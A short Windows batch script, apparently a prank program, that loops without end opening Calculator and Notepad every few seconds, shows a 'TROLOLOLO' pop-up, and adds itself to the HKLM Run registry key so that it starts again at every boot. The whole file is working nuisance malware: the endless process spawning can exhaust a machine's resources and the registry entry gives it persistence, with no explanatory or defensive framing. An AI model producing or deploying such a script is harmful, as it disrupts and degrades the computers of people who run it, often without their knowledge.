@echo off
cls
:A
start calc.exe
ping localhost -n 3 >nul 
start notepad.exe
ping localhost -n 3 >nul 
msg * "TROLOLOLOLOLOLOLOLOLO"
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f /v Autoexec /t reg_sz /d "C:\Autoexec.bat"
goto A
